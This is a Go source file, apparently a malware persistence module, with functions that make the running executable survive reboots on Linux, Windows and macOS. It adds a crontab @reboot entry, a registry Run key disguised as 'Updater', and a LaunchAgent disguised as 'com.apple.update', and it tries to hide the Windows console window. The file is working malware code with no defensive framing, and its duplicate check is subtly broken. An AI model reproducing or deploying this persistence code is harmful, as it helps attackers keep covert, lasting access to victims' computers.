package persistence

import (
	"os"
	"os/exec"
	// "syscall"
	"runtime"
	"fmt"
	"path/filepath"
)

func AddToCron() {
	cronEntry := "@reboot " + os.Args[0] + "\n"
	cronFile := "/tmp/.cronjob"

	cmd := exec.Command("crontab", "-l")
	output, _ := cmd.Output()

	if !contains(string(output), cronEntry) {
		file, _ := os.Create(cronFile)
		defer file.Close()
		file.WriteString(string(output) + cronEntry)
		exec.Command("crontab", cronFile).Run()
		os.Remove(cronFile)
	}
}

// Windows
func AddToRegistry() {
	exePath, _ := os.Executable()
	regCmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", "Updater", "/t", "REG_SZ", "/d", exePath, "/f")

	if runtime.GOOS == "windows" {
		// regCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} -- ONLY WORKS WHEN BUILDING FOR WINDOWS
	}

	regCmd.Run()
}

// Helper function to check if text contains a substring
func contains(text, substring string) bool {
	return len(text) >= len(substring) && text[:len(substring)] == substring
}

func AddToLaunchAgent() {
	exePath, _ := os.Executable()
	plistPath := filepath.Join(os.Getenv("HOME"), "Library/LaunchAgents", "com.apple.update.plist")

	plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>`, exePath)

	// Write plist file
	err := os.WriteFile(plistPath, []byte(plistContent), 0644)
	if err != nil {
		fmt.Println("Error writing LaunchAgent:", err)
		return
	}

	// Load the Launch Agent
	exec.Command("launchctl", "load", plistPath).Run()
}